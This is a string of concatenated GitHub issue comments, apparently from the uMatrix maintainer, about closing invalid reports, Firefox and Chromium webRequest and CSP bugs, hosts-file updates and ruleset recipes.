before opening new ones, all these points are already opened.. Closing and marking as invalid, as per CONTRIBUTING.. Closing and marking as invalid, as per CONTRIBUTING.\nYou deleted the following instructions when you created your issue:\n\nFor question/support/discussions, there is Reddit's /r/uMatrix:\nhttps://www.reddit.com/r/uMatrix/. Closing and marking as invalid, as per CONTRIBUTING..  https://github.com/gorhill/uMatrix/wiki/Per-scope-switches. I thought \"Strict HTTPS\" (to forbid mixed content) would have been the issue.. Closing and marking as invalid, as per CONTRIBUTING.. Closing and marking as invalid, as per CONTRIBUTING.. Force a reload using the shift key please, to bypass browser cache.. On my side Shift-F5 is enough, or to be sure, Shift-click uMatrix's own reload button in the popup panel.\n\nBugzilla entry for issue here: https://bugzilla.mozilla.org/show_bug.cgi?id=1376932. Actually, I see the bugzilla issue has a workaround in it, and I think I will consider implementing it.. Can you explain why you closed the issue?. There is no built-in specific whitelist rules, by design. Specific whitelist rules are for everyone to decide for themselves.. Closing and marking as invalid, as per CONTRIBUTING.. > with more than one screen connected\nBrowser issue: https://bugzilla.mozilla.org/show_bug.cgi?id=1387340.. Actually, issue is invalid -- this is the by-design behavior, reporting descendant hostnames as dark red would mislead the user into thinking there are explicit block rules for all descendants, while this is not the case. Below base domain rules can only be set manually, and thus it is expected the user will understand why a specific domain is reported as blocked despite the visual discrepancy. I had gone through all that thinking a long while ago, just forgot about all this.. Merging changes as is, with no code review or testing, just for your convenience.. Duplicate of #824.. I am going to transcribe your paragraph as steps for clarity -- tell me if I got something wrong:\n\n\nuMatrix is set-up to block both third and first party scripts on that domain and all domains that it loads.\nRule * * script block added to uMatrix's default ruleset\n\n\nOpen fastpic.ru on the latest Firefox 57.0.3 with uMatrix 1.1.20 configured with above rule.\nResult: the page displays like CSS is messed up or not loading or something is wrong with the page\n\nWhen I set the browser preference javascript.enabled to false the page loads correctly.\n\nRegarding the difference between uMatrix with javascript disabled and the browser with javascript disabled:\nWith javascript disabled through the browser's config:\n\nWith javascript disabled through uMatrix:\n\nThe difference disappears when you remove the block rule for static.fastpic.ru: there are images and stylesheets resources pulled from that subdomain, and that subdomain is blocked by one of the hosts file selected by default in uMatrix. The matrix UI shows clearly that some resources are blocked from that subdomain, so this should have been the first thing to look at. Once the block rule for the subdomain is removed, no difference with when javascript is blocked through browser's config:\n\nNow to ensure that uMatrix works best, do not test it with YesScript2: this extension listens to onHeadersReceived event and potentially returns the response headers. There is an issue in Firefox which will make the browser discard the header modifications by one extension when another one does act as if it modified them.  See https://github.com/ghacksuserjs/ghacks-user.js/issues/265#issuecomment-343544735.\nAside this, it may happens that you need to reload and force the browser to bypass its cache: see https://github.com/gorhill/uMatrix/issues/893.\nAside these known issues for which there are workaround (you will have to disable YesScript2), uMatrix is completely reliable. Use the browser console to see that the browser reports inline script tags as blocked.. I corrected myself above, I misread the code in YesScript2. In any case, please provide exact, clearly laid out repro steps to be sure I understand what exact scenario you say you have an issue. As said in my response, scripts were blocked all fine on my side. Using uMatrix as the only extension.. I don't know how YesScript plain works, a quick glance and I can't tell, I would need more time to find out. I can't try FF56 for the moment due to lack of time (need to download, new profile, etc.)\nHowever see if the browser console reports that inline script tags aren't executed, this is a telltale sign that uMatrix is blocking 1st-party scripts:\n\nBy the way, mixing legacy extensions with WebExtensions ones is known to cause issues, it's something I've had to repeat often to people who were still using uBO with legacy extensions.. With WebExtensions there is no other way to control javascript execution of inline script. All WebExtensions which purpose is to control javascript now relies on CSP (YesScript2, NoScript, etc.)\nSee https://bugzilla.mozilla.org/show_bug.cgi?id=1392090.. !image !cookie. Marking as invalid because this is explained in the documentation.. Browser bug: https://bugzilla.mozilla.org/show_bug.cgi?id=1385832. Closing and marking as invalid, as per CONTRIBUTING.. I need reproducible steps. Yours are quite demanding -- I need top setup a web server. Since you can reproduce on your side, best would be you investigate the issue. It's not necessarily uMatrix, you should test with other extensions which also modify the sent and received headers -- this could show that the issue is not specific to uMatrix. Bottom line, please contribute by investigating further the issue you see.\nThere are other problems with your issue, for example you did not provide browser info, or look at the logger, or provide some analysis as to the provenance of those \"mishmash chars\". In the end because of the lack of investigation on your side, I closed as invalid.\n  . Thanks.. When you block stuff, expect pages to not render perfectly pixel-wise.. Closing and marking as invalid, as per CONTRIBUTING.. Go to about:debugging, \"uBlock Origin\", click \"Debug\", select \"Storage\".\nReminder: please respect CONTRIBUTING.. Duplicate of #907.\nI can't reproduce such issue, so there is nothing I can do. uMatrix injects CSP in response header, please investigate on your side if this is what is causing your issue, and find out why.\n  . Here is a page with many frames: http://metalelf0.github.io/VimColorSchemeTest-Ruby/python.html\nNo issue here.\nUnless more investigation is made by those how have the issues, so as to make the case the issue is with uMatrix specifically, I will have to close this issue. Could be Chromium, or your internal server (both of you share this trait).. With uBlock Origin you can force a CSP header to be added to the response headers:\n||example.com^$csp=worker-src 'none'\n\n. Also duplicate of #698.. I looked at ruleset of user in #698, and he was blocking 1st-party scripts, which means uMatrix had to inject a CSP header in order to prevent inline script execution.\nuMatrix 1.2.0 injects a CSP header all the time now, in order  to detect web worker usage or to block web worker usage.\nThis suggests there might be a bug in Chromium when it comes to deal with response headers modified by an extension.. > I have an internal webpage\nIs the charset declared in the response headers? Otherwise are the pages served with the <meta charset=\"...\"> tag near the top?. The only thing uMatrix does to these response headers is as follow:\nCache-Control:private\nContent-Encoding:gzip\nContent-Length:9850\nContent-Type:text/html; charset=UTF-8\nDate:Wed, 10 Jan 2018 01:47:45 GMT\nExpires:0\nPersistent-Auth:true\nServer:Microsoft-IIS/7.5\nSet-cookie:authrequired=\nVary:Accept-Encoding\nX-Powered-By:ASP.NET\nContent-Security-Policy-Report-Only: ...\n\nThat is, to simply add a Content-Security-Policy and/or Content-Security-Policy-Report-Only header according to how uMatrix is configured. Nothing else is done to these headers, and uMatrix does nothing with the response data itself, that is out of uMatrix's reach.\nGiven this I think you should submit an issue to Chromium devs -- but they will also have difficiculty dealing with a non-reproducible case on their side.\nAre the frames for which you have garbled data https? I thought it might be an encoding issue, but given this seems related to Strict-Transport-Security, now I wonder if the garbled data is un-decrypted encrypted data.. > The browser is at least part of the problem but\nExtensions use the browser API. Please report to Chromium devs, there is nothing uMatrix is doing to cause this garbled data.. @th0ma5w On what site(s) do you suffer the issue?. > My organization uses a MS proxy, which given the various other issues seems to be the culprit... if any request to any site has some additional header that it may or may not expect, it stops working well at all.\nAren't you referring to request headers? uMatrix may modify only the following request headers, according to your ruleset:\n\nCookie: will be removed if cookies are blocked for the destination.\nReferer: will be modified if \"Spoof HTTP referrer string of third-party requests\"  is enabled in the relevant scope.\n\nIn any case, I just added the raw setting disableCSPReportInjection in 1.2.1rc0, default to false. Set to true to prevent injection/modification of Content-Security-Policy-Report-Only in response headers. (documentation)\n. @th0ma5w So given your findings, would the issue be more accurately described as follow?\n\"When using a proxy, an extension modifying the response headers may cause Chrome to parse improperly the response body\". @SergeiShir please report your findings on the Chromium issue, as said issue is not uMatrix (it could be your proxies too I suppose?), uMatrix just add one header using webRequest API, as allowed by the API.\nIf people reports on the Chromium issue, it has more chance to be looked at (star it too). I will lock this issue because just adding \"me too\" to it does not help to have it resolved.\nMeanwhile, workaround is this.. One extra bit of information which could be useful: Can you reproduce the same issue with uMatrix on FF57+? (with disableCSPReportInjection set to false of course). disableCSPReportInjection is false by default.\nSo this further confirm a browser bug.. Reportedly fixed in Chromium 66: https://bugs.chromium.org/p/chromium/issues/detail?id=801237.. By design there isn't and won't be any specific whitelist rules in uMatrix. Each user can add them as needed.. You don't understand what you are changing: what you changed is not 15 minutes to 1 minute, it's 15 seconds to 1 second.. Block CSS.. Use the Tor browser.. If you think something can be done which is well within the scope of uMatrix's purpose, please share. Closing for now.. Duplicate of #811.. Please file an issue with browser devs, this is best handled in there.. My bad, I ended up uploading the wrong version. Fixed by uploading 1.2.1rc2.. Front page of the project:\n\nuMatrix does not guarantee that sites will work fine: it is for advanced users who can figure how to un-break sites, because essentially uMatrix is a firewall which works in relaxed block-all/allow-exceptionally mode out of the box: it is not unexpected that sites will break.\nSo this means do not file issues to report broken sites when the sites are broken because uMatrix does its job as expected. I will close any such issue without further comment.\n\n. Closing and marking as invalid, as per CONTRIBUTING.. - No browser version.\n- No clear, detailed steps to reproduce.\n- Nobody should have to transcribe text from pictures.\n- Pics are for complementary information: no primary information provided about what are the pics are showing.. Properly transcribing into detailed steps to reproduce:\n\nLaunch FF57 (no tab should load)\nOpen browser console (ctrl-j)\nOpen uMatrix logger\nEnsure matrix filtering is enabled in behind-the-scene scope and all is blocked\nOpen new tab for http://archive.is\nEnter google.com into \"My url is alive and I want to archive its content\"\nObserve in logger: http://www.google.com/s2/favicons is red (meaning blocked)\n\nObserve in browser console: GET http://www.google.com/s2/favicons. Observation: I followed the code up to Firefox's own code:\nresource://gre/modules/MessageChannel.jsm, line 740:\nresponse :\n    messageName : \"1390-0\"\n    recipient : {}\n    result : 0\n    value : {...}\n    cancel : true <<<<<<<\n\n\nuMatrix properly tells webext API to cancel the request. However, uMatrix's response seems to be disregarded by Firefox.. Browser bug. I created a minimal extension to block anything with favicon in it, and this is the output of the browser console after trying various links, with only that one extension installed:\n11:37:35.843 blocking tabId=-1 requestId=18 url=https://jb-rubinovitz.ghost.io/favicon.ico  background.js:8:9\n11:37:35.875 onErrorOccurred: favicon request: 18  background.js:37:9\n11:37:37.074 GET https://jb-rubinovitz.ghost.io/favicon.ico [HTTP/2.0 200 OK 19ms]\n11:38:42.854 GET https://news.ycombinator.com/favicon.ico [HTTP/2.0 200 OK 15ms]\n11:39:10.865 blocking tabId=-1 requestId=160 url=https://assets.guim.co.uk/images/favicons-garnett/ac43fe9507600081b58760450f518d07/152x152.png  background.js:8:9\n11:39:10.866 blocking tabId=-1 requestId=161 url=https://assets.guim.co.uk/images/favicons-garnett/48bc5564bb01b74cf7cd1a08ae0dd98e/32x32.ico  background.js:8:9\n11:39:10.870 onErrorOccurred: favicon request: 160  background.js:37:9\n11:39:10.871 onErrorOccurred: favicon request: 161  background.js:37:9\n11:39:12.295 GET https://assets.guim.co.uk/images/favicons-garnett/48bc5564bb01b74cf7cd1a08ae0dd98e/32x32.ico [HTTP/2.0 200 OK 37ms]\n11:39:35.712 blocking tabId=-1 requestId=322 url=https://www.hetzner.com/themes/hetzner/images/favicons/apple-touch-icon.png  background.js:8:9\n11:39:35.713 blocking tabId=-1 requestId=323 url=https://www.hetzner.com/themes/hetzner/images/favicons/favicon-16x16.png  background.js:8:9\n11:39:35.715 onErrorOccurred: favicon request: 322  background.js:37:9\n11:39:35.715 onErrorOccurred: favicon request: 323  background.js:37:9\n11:39:40.486 GET https://www.hetzner.com/themes/hetzner/images/favicons/favicon-16x16.png [HTTP/1.1 200 OK 113ms]\n11:39:57.752 blocking tabId=-1 requestId=370 url=https://daverupert.com/favicon.ico  background.js:8:9\n11:39:57.757 onErrorOccurred: favicon request: 370  background.js:37:9\n11:40:00.095 GET https://daverupert.com/favicon.ico[HTTP/1.1 200 OK 45ms]\n\nTwo types of error are seen:\n\nSometimes the tabId === -1 requests are not submitted to webRequest listeners, hence these can't be blocked/reported by an extension.\nWhen the requests are submitted, Firefox disregards the order to block them.\n\nThe bug will have to be reported to Firefox devs: https://bugzilla.mozilla.org/.\nHere are the steps:\n\nLaunch Firefox 57.0.4 with no tab opened.\nabout:config settings:\nnetwork.dns.disablePrefetch = true\nnetwork.predictor.enabled = false\nnetwork.prefetch-next = false\nnetwork.http.speculative-parallel-limit = 0\n\n\nI have Firefox set to delete cache/cookies when closing Firefox.\n\n\nGo to about:debugging, load temporary minimalist extension: https://gist.github.com/gorhill/81e01119f78dac46ead5b8ba0c34bf18 (save locally both files in a new folder).\nOpen browser console (ctrl-j), filter output with favicon. be sure \"Net\" and \"Logging\" are enabled.\nOpen a new tab, load https://news.ycombinator.com/.\nReported in console:\nGET https://news.ycombinator.com/favicon.ico\n\n\nNothing logged by the extension, suggesting the request was not submitted to webRequest listeners.\n\n\nOpen a new tab, load https://spreadprivacy.com/privacy-simplified/\nReported in console:\nGET https://spreadprivacy.com/favicon.png\n\n\nNothing logged by the extension, suggesting the request was not submitted to webRequest listeners.\n\n\nOpen a new tab, load https://about.gitlab.com/2018/01/22/gitlab-10-4-released/\nReported in console:\nblocking tabId=-1 requestId=757 url=https://about.gitlab.com/ico/favicon-192x192.png\n      blocking tabId=-1 requestId=758 url=https://about.gitlab.com/ico/favicon-32x32.png\n      onErrorOccurred: favicon request: 757\n      onErrorOccurred: favicon request: 758\n      GET https://about.gitlab.com/ico/favicon-32x32.png\nExtension canceled the requests, confirmed by onErrorOccurred listener, yet the browser console shows that a network request was still made for one of the favicon.\n. Can somebody report it please? I posted all the information and repro steps above.. Fixed in Firefox 58, as per https://bugzilla.mozilla.org/show_bug.cgi?id=1433700.. It's not a Content-Security-Policy, it's a Content-Security-Policy-Report-Only, it has not effect except for allowing uMatrix to know when a web page tries to use a web worker.. > you're stating that I'm simply mis-interpreting these \"[Report Only]\" error messages as errors\n\n\n\n\n\nYes, because you said:\n\nleaves behind a Content-Security-Policy that interferes with my application.\n\nThey are report-only CSP directives, they can't interfere with your application. If you do not want the csp-report, see https://github.com/gorhill/uMatrix/wiki/Raw-settings#disablecspreportinjection.. The purpose is for uMatrix to be able to report that web workers are used on a site. Without this CSP reports, it's not possible to inform about this. Such information is key in deciding what rules should apply to a site.. > matrix-off is like a \"disable uMatrix extension for this domain/host\nIt's not:\n\nThe per-scope switches are independent from the matrix filtering switch, meaning that if you toggle off matrix filtering, the per-scope switches which are toggled on will still apply. For example, one could turn off matrix filtering while keeping the ability to forbid mixed content.\n\nIf a site is mining coins, you want to know about this, regardless of the state of uMatrix, and arguably even more so if one disabled all parts of uMatrix.. As said above, see https://github.com/gorhill/uMatrix/wiki/Raw-settings#disablecspreportinjection.. It does not matter who set the content security policy, the browser will always output violations at the console.. https://bugzilla.mozilla.org/show_bug.cgi?id=1376953. > This would prevent CSP reports for whitelisted domains\nAs already pointed out, the report is needed to inform about use of workers. Not blocking workers on a domain is not equivalent to \"don't tell me if workers are being used\" on this domain. Information about whether workers  are used is key in deciding on whether to block or allow them.. > It doesn't call home by default\nIt never calls \"home\", I don't own GitHub servers.\n\nDefault third party rules are dangerous.\n\nThey are all block rules.. > Indeed, they are run by third parties though.\nThe point is, how are 3rd-party blocking rules \"dangerous\"? I can't make sense of this. On top of default-deny, 3rd-party block lists can only further restrict, never relax where the browser is allowed to connect.. It's ok if people do not want hosts files, it's their choice, uMatrix does not force anybody to keep the checkboxes checked. The dubious claim here is \"third party rules are dangerous\". None of these imported rules will relax uMatrix's current ruleset -- it's the opposite they contribute to make the current ruleset stricter, so \"dangerous\" here amount to nothing more than FUD.. > FUD? My point was the lists are now going to be enabled by default.\nI responded to your:\n\nDefault third party rules are dangerous.\n\nJust make a convincing argument as to why adding more block rules on top of whatever ruleset is in effect is \"dangerous\".. Neither Chromium and Firefox guarantee that content is loaded after extensions are ready.. Surprisingly I could not find any duplicate about this. I want to keep it open for now to find out whether I can bring here uBO's suspendTabUntilReady approach, except that it would be the default behavior here (no special experimental flag) -- and I can now have a saner implementation given that I no longer have to care for Firefox legacy version. If after this you still have the issue, then it will become a browser one.. Why open an issue which you know to be a duplicate? (and also known to be a browser issue?)\nuMatrix does not deal with response body data, there is no extensions API in Chromium to do so -- this is a browser issue, there is nothing I can do aside offering a workaround which seems to trigger less the browser issue.. I locked because of the unproductive comment:\n\nWhy do you suggest that this is a Chrome problem and not your plugin\n\nNow:\n\nI get the feeling, that my contribution is not welcome here\n\nIt's a browser issue, there is nothing I can do (aside the already available and documented workaround), I already said so in the other issue.. I don't have Chromium 64 yet, so I can't test for now.\nI looked at the code, and uMatrix properly initializes the last-used time to the current time (Date.now()), so this is an odd issue.. But you said:\n\nIf I disable this [uMatrix] setting, cookies survive restarts\n\nPeople in the bug report do not mention uMatrix.. > However I am still unable to pin for sure if it has anything to do with uMatrix\nThis is not in your original comment -- you unequivocally said there was an issue with uMatrix (\"If I disable this setting, cookies survive restarts\"). Now you say that you are not sure it's uMatrix, while I do ask repeatedly in here that the case must be made that there is an issue with uMatrix, otherwise I end up wasting a whole lot of time on issues which have nothing to do with uMatrix.. You removed built-in rule matrix-off: behind-the-scene true. Did you look at the behind-the-scene requests in the logger?. Duplicate of #912.. Why open a duplicate?. > to include the fact that some HTTPS sites are unable to load and simply return Chrome errors (as opposed to showing a garbled page)\nThis is out of uMatrix control, this is happening inside the browser itself. uMatrix merely inject a CSP header through extensions API, then from there this is in the hand of the browser. The browser parser is not something exposed to extensions.. Benchmark is launch time with all stock hosts files selected, 84,857 distinct hostnames (8,322 duplicates were rejected but still needed parsing).\nBefore, 718.2 ms:\nAfter, 127.6 ms:\n\nWhen loading from selfies, the peak memory at launch time is vastly reduced as per Chromium's Task manager: from slightly over 60 MB (garbaged-collected to ~32 MB) to 28 MB (garbage-collected to ~26 MB).\n. > In what way do you find it clunky?\nRequires more than one click to change scope, and make scoping less prominent -- which is a core concept in uMatrix. I've seen so many \"I can't create a rule which applies everywhere\", and making the global scope in full view ready to be used is bound to help with this. Actually, I should add a tooltip to the global scope button to explicitly state its purpose.. Current scope selector is by-design, I do not intend to change it.. The blue border is by-design, it's to visually convey that the current selection is a subset of all fields available inside the whole button (whole = blue border).. I made modifications which makes the backup file not forward compatible, i.e. you can load old backups with the newer versions of uMatrix, but not newer backups with older versions of uMatrix. You will have to install the beta version of uMatrix on Vivaldi.\nAt some point I can't keep forward compatibility if I want to improve the output of the backup file, there is old stuff in there that was not saved concisely. For example, one of the change I want to do today is save the rules as an array in the backup file, so that all rules are easy to see/modify with a simple text editor. Currently it's very difficult because the rules are all concatenated into a single JSON string.. I missed the fact that the error also occurs when restoring from current backup.. Partial workaround is to export/import rules from with the \"My rules\" pane.. Are you blocking web workers?. I am going to use this issue to fix two things:\n- Make the badge reports block count\n- Inline script tags reported as blocked resources even when it's not the case\nThe point is that just the color of the icon should be enough to convey that there are stuff still blocked. In the current case the icon still had red in it, so there was a hint that something was still blocked. The change to the badge is just to make this more obvious.\nEven after allowing all, the icon still had red in it, because of the inline script tag issue above.\n. You will have to investigate this on your side, you are better placed than me. uBO just use the storage.sync API, all the rest is handled by Firefox.. Closing and marking as invalid, as per CONTRIBUTING.. Thanks.. Unable to reproduce with Chromium 64.\nI don't support Vivaldi. Be sure you reload with bypassing the cache after you change rules and do not see the effects.. Volunteer developer(s) for Vivaldi will have to step up and offer support for it -- I just can't add more work to what I am already committed on my side. Best is a fork for Vivaldi so that issues specific to Vivaldi gets reported to the fork rather than here. I will accept pull request fixes for Vivaldi if I feel they are not undermining code sanity (i.e. ugly patches for weird Vivaldi-specific issues won't be accepted).. Dashboard => Settings => \"Default scope level\" => set it to Site.. Fixed in fe995d2bc8e5.. @guest20 Did you try to increase the font size in the Settings pane in the dashboard?. See \"How to access the popup panel when there is no toolbar\".. Report such browser crashes to Firefox devs. uMatrix is HTML/CSS/JS, it's not supposed to crash.. I can't sign in even without uMatrix installed.\nIn any case, never file an issue here without first using the logger to assert that uMatrix is blocking/modifying something as per your current ruleset.. As stated on the front page of the project, any issue arising as a result of uMatrix enforcing whatever ruleset is in effect -- and as reported in the logger -- must not be reported here.. Use the logger in such case, you can bring the popup panel from the logger: https://github.com/gorhill/uMatrix/wiki/How-to-access-the-popup-panel-when-there-is-no-toolbar.. Never mind, the logger does not help in the current case.. I am going to add a dropdown list for the 3rd-cell in the logger, from which one can click a rule to add to the temporary ruleset:\n| Source            | Destination             | Type\n| -----------------:| -----------------------:| ----:\n| aar.ark-group.org | r3tiles-a.titanmods.xyz | xhr\n| aar.ark-group.org | r3tiles-a.titanmods.xyz |   \n| aar.ark-group.org |           titanmods.xyz | xhr\n| aar.ark-group.org |           titanmods.xyz |   \n|     ark-group.org | r3tiles-a.titanmods.xyz | xhr\n|     ark-group.org | r3tiles-a.titanmods.xyz |   \n|     ark-group.org |           titanmods.xyz | xhr\n|     ark-group.org |           titanmods.xyz |   \n|                 * | r3tiles-a.titanmods.xyz | xhr\n|                 * | r3tiles-a.titanmods.xyz |   \n|                 * |           titanmods.xyz | xhr\n|                 * |           titanmods.xyz |   \n. \n. By design.. > Also, the 3 'avatars_..githubusercontent.com' entries\ngithubusercontent.com is a public suffix.. I don't see anything wrong. If I have only this one list enabled, the version shipped with uMatrix says \"13,242 used out of 13,248\". Forcing an update of the list results in the count becoming \"13,272 used out of 13,278\". Clicking the clock icon marks the list as out of date -- it does not remove the cache. Forcing an update of course will just cause the same version as the cached one to be downloaded, hence the count won't change.. Did you verify that the list is not pulled from the browser cache?. > How do I verify that for this issue specifically ?\nchrome://extensions/ => \"Developer mode\" enabled => uMatrix => Click background.html => Select Network pane => Force an update of the list => see if request if fetched from cache:\n\nAlso, sometime the server itself may serve its own cached version.. > Clicked on Purge All Caches and still no effect. The number remains the same even though the count should have gone up to 24,151 from 24,150.\nPurging the cache just cause the list to be marked as \"out of date\" (making it a candidate for update), it does not remove it from uBO's cache.. I explained above to you why this is this way.. A solution to what? There is no issue = nothing to solve. Having uMatrix fall back to the packaged version is not a desirable behavior. And even then, there is no guarantee that the number of hostnames in the packaged version will be different then the current one. You focus unduly on a number, what matters is whether the list is marked as obsolete or not.. > So how do I know that the list has been updated or not ? That number is the only way to know.\nReally? Guess which one is up to date and which is not up to date.\n\nIf you still do not trust, use the logger to see the network request being made. If you still do not trust all the evidences, the burden is on you to make the case there is an issue, not on me to convince you there is none -- I spent already way too much time on this non-issue.. There is no difference with uBO.. I did update and the number didn't change after the update was completed.. So? You provide no details as to when was the last update for that resource.\nNow try again:\n\nClick the clock icon: number does not change\nClick \"Update now\" and let it complete: number does not change\n\n. > Do you get my point now ?\nNo. Note that only you is seeing an issue here. Feel free to find other people who can side with you and maybe explain in other words what I supposedly fail to understand.. I think I am reproducing it now -- investigating.. @uBlock-user You were right, I was wrong, sorry for wasting your time.. Yes. I forgot how much stuff changed in the current beta -- I have been mostly working on uBO lately. I am not yet setup to publish a self-hosted signed version of uMatrix beta -- so for now I will have to push an unsigned version with the fix.. There has been no change in that area in 1.3.3b9 relative to 1.3.3b8: https://github.com/gorhill/uMatrix/compare/1.3.3b8...1.3.3b9.. I can not reproduce with Chromium 64.\nI can reproduce with Chrome 66 (dev build).\nSo it looks like a regression in the dev build of the browser.. It's not possible, the browser controls the popup panel, uMatrix just renders in it using HTML/CSS/JS.\nJust bring the popup panel from with the logger, this one is fully controlled by uMatrix: https://github.com/gorhill/uMatrix/wiki/How-to-access-the-popup-panel-when-there-is-no-toolbar.. > install uMatrix and enable 'Auto-update hosts files'\n\nlet Firefox run for 2 hours\n\nWhen I fixed #928, I did find an issue which caused the toggling of auto-update to not take place until the next restart. This is fixed in the dev build.\n\noptional:\nrestart Firefox\n\nAs said, the auto-update setting will take effect after restarting uMatrix. I installed uMatrix 1.3.2 on a fresh Firefox 58.0.2 profile, enabled auto-update, then I restarted the browser. Result:\n\nNote that auto-update kicks in ~7 minutes after uMatrix is started.\nSo, unable to reproduce. Investigate more on your side please.. >  Did you do your test on macOS?\nI don't have macOS. See if there are related error messages in the browser console (ctrl-shift-j).. I have that message when I open the hosts files pane (including with latest dev build). It's inconsequential, it's just that uMatrix can't find a specific localized string and will fall back using an empty string. Anyway, auto-update does not require the hosts file pane to be opened at all.. Browser issue: the view-source:-linked request does not go through uMatrix's webRequest listener. Report to browser devs: https://bugzilla.mozilla.org/.. Closing and marking as invalid, as per CONTRIBUTING.. @irgendsontyp Your issue is invalid: you fail to provide detailed steps to reproduce. It's impossible to say anything. Marking as invalid until you actually make the case that there is an issue with uMatrix through detailed steps to reproduce.\nClosing and marking as invalid, as per CONTRIBUTING.. Duplicate of https://github.com/gorhill/uBlock/issues/2878.. Be sure it's not related to #912.. > does not appear\nI want you to try the workaround  before concluding it's not related. Also, I do not see you mentioning looking at the logger. Did you? Since it's an issue on your side which nobody can reproduce, only you can investigate this. uMatrix merely enforces your ruleset, use the logger to investigate what uMatrix does internally.. What you ask is out of scope of uMatrix. If you are using Firefox + uBlock Origin, try a filter such as reddit.com##^script.. Yes, I corrected my comment afterward.. Duplicate of https://github.com/gorhill/uBlock/issues/1170.\nI thought I was on uBO's issue tracker, I corrected the link above: only one extension can modify a HTTP header, it's a browser API by-design behavior. You will have to find what setting is causing uBO to modify the Content-Security-Policy header and change it such that the CSP header is left free to be modified by uMatrix (or vice-versa, as you want).. I decided to test an idea, and it worked, so re-opening -- I will need to experiment more to be sure though in case there was a flaw in my test.\nThis seems fixable if I inject a new CSP header instead of modifying an existing one -- which both uMatrix and uBO do. Speculating: this is probably a solution because it's allowed for servers to send more than one CSP header.. Unfortunately, added response headers were not merged on Firefox 58 and less:\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1377689, so this means the fix here is a regression for FF58 and less.\nTest case:\nURL:  http://tobago-vm.apache.org/demo-4-snapshot/content/30-concept/80-security/content-security-policy.xhtml?dswid=-3095\nBrowser console with default uBO settings:\nContent Security Policy: Ignoring \u2018x-frame-options\u2019 because of \u2018frame-ancestors\u2019 directive.\nContent Security Policy: Ignoring \u201c'unsafe-inline'\u201d within script-src or style-src: nonce-source or hash-source specified\nContent Security Policy: Directive \u2018child-src\u2019 has been deprecated. Please use directive \u2018worker-src\u2019 to control workers, or directive \u2018frame-src\u2019 to control frames respectively.\nContent Security Policy: Ignoring unknown option 'none'\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cscript-src http://tobago-vm.apache.org\u201d). Source: call to eval() or related function blocked by CSP.\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cscript-src http://tobago-vm.apache.org\u201d). Source: &#x0a;      <![CDATA[&#x0a;      functio....\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cstyle-src 'unsafe-inline' 'nonce-u/AeAK/RSoKWoyl+rn/QBA==' http://tobago-vm.apache.org\u201d). Source: display:none.\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cstyle-src 'unsafe-inline' 'nonce-u/AeAK/RSoKWoyl+rn/QBA==' http://tobago-vm.apache.org\u201d).\n\nAdd filter: ||apache.org^$csp=font-src 'none'\nBrowser console with FF58:\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.woff2?v=4.7.0 (\u201cfont-src 'none'\u201d).\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.woff?v=4.7.0 (\u201cfont-src 'none'\u201d).\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.ttf?v=4.7.0 (\u201cfont-src 'none'\u201d).\n\nBrowser console with FF61, as expected a combination of both output above:\nContent Security Policy: Ignoring \u2018x-frame-options\u2019 because of \u2018frame-ancestors\u2019 directive.\nContent Security Policy: Ignoring \u201c'unsafe-inline'\u201d within script-src or style-src: nonce-source or hash-source specified\nContent Security Policy: Directive \u2018child-src\u2019 has been deprecated. Please use directive \u2018worker-src\u2019 to control workers, or directive \u2018frame-src\u2019 to control frames respectively.\nContent Security Policy: Ignoring unknown option 'none'\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cscript-src\u201d). Source: call to eval() or related function blocked by CSP.\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cscript-src\u201d). Source: &#x0a;      <![CDATA[&#x0a;      functio....\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.woff2?v=4.7.0 (\u201cfont-src\u201d).\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.woff?v=4.7.0 (\u201cfont-src\u201d).\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at http://tobago-vm.apache.org/demo-4-snapshot/tobago/standard/font-awesome/4.7.0/fonts/fontawesome-webfont.ttf?v=4.7.0 (\u201cfont-src\u201d).\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cstyle-src\u201d). Source: display:none.\nContent Security Policy: The page\u2019s settings blocked the loading of a resource at self (\u201cstyle-src\u201d).. https://bugzilla.mozilla.org/show_bug.cgi?id=1445537. Unable to reproduce with FF58.. I will try again with FF59 once it becomes available on my OS.. Not found in issue report:\n\n\nWhether this occurs in stable release of the browser\nWhether errors are reported in page and extension console\n. Which is a rule you added yourself.. If you want to submit recipes for inclusion in official built-in recipes, please submit them one by one, such that each can be inspected/validated by everyone. Also, I see you have Chinese sites in there, these should be in their own file -- this means a new CHN recipes resource would need to be created.\n\nI still need to add documentation about how recipes should be crafted, I didn't have the time yet.. I am going to write some documentation and come back when done.. This is what I have now: https://github.com/gorhill/uMatrix/wiki/Ruleset-recipes. Consider this a first draft, I will edit according to feedback.\nSomething I forgot to mention, there is a yet-to-be-documented advanced setting to make it easy to road-test recipes: set contributorMode to true in the More pane, this will add a widget in the Assets pane which purpose is to add inline recipes -- \"My recipes\".. Thanks for your contribution.\nHowever, can you change\n\nAvailable recipes for this site\n\nTo\n\nImport ruleset recipes into this scope\n\nThanks.. The puzzle icon is a scope-related one, all scope-related icons appears near the scope selector, so I do not intend to change this.. Ok, I agree it makes sense.. @Atavic There is no issue until there is actual sound evidence of an issue -- no point blaming Firefox -- the only one to blame here is @EC-O-DE for opening an utterly invalid issue.. Best is to link to the wiki: 